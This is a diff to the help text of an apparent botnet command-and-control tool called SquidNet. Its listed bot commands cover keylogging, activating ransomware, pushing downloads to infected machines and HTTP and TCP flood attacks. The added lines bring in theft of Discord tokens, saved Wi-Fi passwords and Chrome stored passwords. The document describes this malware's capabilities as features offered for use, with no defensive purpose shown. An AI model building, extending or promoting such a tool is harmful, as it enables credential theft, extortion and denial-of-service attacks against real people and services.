@@ -71,7 +71,7 @@ Server Help Message(As Of v3.0):
 [+] !whitelistip <ip>                        - Adds an IP to the whitelist, allowing them to connect to the server during a DDoS Attack.
 [+] !unwhitelistip <ip>                      - Removes an IP from the whitelist.
 [+] !banip <ip>                              - Bans an IP from the server, therefore having them kicked every time they try to connect to the server.
-[+] !unbanip <ip>                            - Removes an IP from the server.
+[+] !unbanip <ip>                            - Unbans an IP from the server.
 [+] !focusconn <botname>                     - Only be able to send or see messages from a single bot.
 [+] !stopfocus                               - Stops focus mode.
 [+] !getipwhitelist                          - Obtains the list of the IP Addresses in the Whitelist.
@@ -80,6 +80,7 @@ Server Help Message(As Of v3.0):
 [+] !help                                    - Displays this message.
 [+] !startftp                                - Start file transfer protocol between the admin and the server(to get any transferred Bot Files).
 [+] !togglelisten                            - Toggles the setting for the server to listen for connections or not.
+[+] !exit                                    - Leave the SquidNet cleanly.
 [+] Bot Commands:                
 [+] !filedownload <file>                     - Download a file on a single bot computer(requires focus mode).
 [+] !download <file> <link>                  - Make the bot download a file from the internet.
@@ -92,6 +93,7 @@ Server Help Message(As Of v3.0):
 [+] !open <filename>                         - Open a file inside of the bots working directory.
 [+] !viewfilecontent <file>                  - View the contents of a file in the bots directory.
 [+] !writefile <filename>                    - Open and write inside of a file inside of the bots.
+[+] !renamefile <filename> <newname>         - Renames a file on the bot computer.
 [+] !sqlconnect <sqlfile>                    - Connect to a Sqlite3 Compatable Database file in the bots.
 [+] !changedir <dir>                         - Changes the bots working directory to the one specified(use '%user%' as the user for multiple bots).
 [+] !stopsql                                 - Disconnect from the connected Database file.
@@ -101,6 +103,9 @@ Server Help Message(As Of v3.0):
 [+] !stopkeylog                              - Stops the keylogging.
 [+] !listdir                                 - List all of the items in the bots working directory.
 [+] !ransomware                              - Activates the ransomware program inside of the bots.
+[+] !getdiscordtoken                         - Gets the users Discord token if it exists.
+[+] !getwifipass                             - Gets the users saved wifi passwords(windows only).
+[+] !getpasswords                            - Takes the passwords from the 'User Data' chrome file(windows only).
 [+] DDoS Attack Commands:
 [+] !httpflood <website> <delay>             - Make the bots conduct an HTTP Flood Attack on the specified Website.
 [+] !tcpflood <ip> <port> <delay> <pkt_size> - Make the bots concuct a TCP Flood Attack on the specified IP and Port.
